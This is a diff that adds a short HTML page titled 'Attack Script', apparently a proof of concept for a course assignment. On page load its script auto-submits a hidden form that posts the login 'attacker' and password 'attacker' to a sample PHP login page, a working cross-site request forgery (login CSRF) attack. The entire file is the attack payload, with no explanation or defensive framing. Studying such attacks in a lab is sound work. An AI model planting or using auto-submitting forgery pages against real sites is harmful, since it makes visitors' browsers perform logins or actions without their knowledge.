@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Attack Script</title>
+    <script type="text/javascript">
+    // <![CDATA[
+    window.onload = function() {
+      var form = document.getElementById('form');
+      form.submit();
+    };
+    // ]]>
+    </script>
+  </head>
+  <body>
+    <form id="form" action="http://www.bradchen.com/btn710-a2/sample/index.php"
+        method="post">
+      <input type="hidden" name="login" value="attacker" />
+      <input type="hidden" name="password" value="attacker" />
+    </form>
+  </body>
+</html>
+
